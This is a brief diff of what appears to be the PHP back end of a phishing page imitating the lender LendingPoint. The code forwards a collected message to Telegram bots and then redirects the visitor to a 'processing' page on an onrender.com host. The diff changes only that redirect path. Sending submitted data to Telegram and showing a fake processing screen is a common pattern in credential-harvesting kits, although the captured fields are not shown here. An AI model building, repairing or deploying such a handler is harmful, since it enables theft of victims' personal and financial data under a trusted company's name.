@@ -92,7 +92,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://lendingpoint.onrender.com/processing.html");
+header("Location:https://lendingpoint.onrender.com/lendingpoint/processing.html");
 
 exit; 
 }
